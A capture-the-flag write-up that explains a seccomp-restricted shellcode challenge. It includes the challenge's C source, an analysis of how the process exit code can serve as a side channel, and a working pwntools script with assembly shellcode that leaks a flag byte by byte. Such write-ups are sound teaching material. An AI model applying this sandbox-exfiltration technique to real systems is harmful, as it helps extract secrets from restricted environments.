#metadata(
  (
    title: "Side-Channel Leak via Exit Code",
    description: "Leaking data from a restricted sandbox by using the process exit code as a communication channel.",
    date: "2025-12-30",
    order: 10,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Side-Channel Leak via Exit Code

== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 1);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);

    int shellcode_size = read(0, shellcode, 0x1000);

    scmp_filter_ctx ctx;

    ctx = seccomp_init(SCMP_ACT_KILL);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0) == 0);

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

== Vulnerability Analysis

The challenge allows us to open a file (via `argv[1]`), but the seccomp filter restricts us to only `read` and `exit`. We cannot use `write` to print the flag to stdout.

However, the `exit` syscall takes an integer argument (the exit status), which is returned to the parent process. This creates a side-channel: we can read one byte of the flag and pass it as the exit code. By repeating this process for each byte, we can reconstruct the entire flag.

== Exploitation Plan

1.  *Read Flag:* Use the `read` syscall to read the flag from the pre-opened file descriptor (FD 3) into memory.
2.  *Leak Byte:* Select a specific byte from the read buffer and use it as the argument for the `exit` syscall.
3.  *Automation:* Write a script to run the binary repeatedly, incrementing the index of the byte to leak, and capturing the process's exit code each time.

== Exploit Script

```python
from pwn import *

exe = "./challenge"
context.binary = exe

flag = ""
index = 0

while True:
    # Shellcode to read flag and exit with byte at 'index'
    shellcode = asm(f"""
        /* read(3, stack, 100) */
        mov rdi, 3          /* fd: 3 */
        mov rsi, rsp        /* buffer */
        mov rdx, 100        /* count */
        mov rax, 0          /* syscall: SYS_read */
        syscall

        /* exit(buffer[index]) */
        movzx rdi, byte ptr [rsp + {index}]
        mov rax, 60         /* syscall: SYS_exit */
        syscall
    """)

    # Run with /flag as argument to open it on FD 3
    p = process([exe, "/flag"], level='error')
    p.send(shellcode)
    
    # Wait for process to exit and get the exit code
    p.wait()
    exit_code = p.poll()
    p.close()

    # Null terminator or error implies end of string
    if exit_code <= 0:
        break
        
    flag += chr(exit_code)
    print(f"Leaked: {flag}")
    index += 1

print(f"Final Flag: {flag}")
```
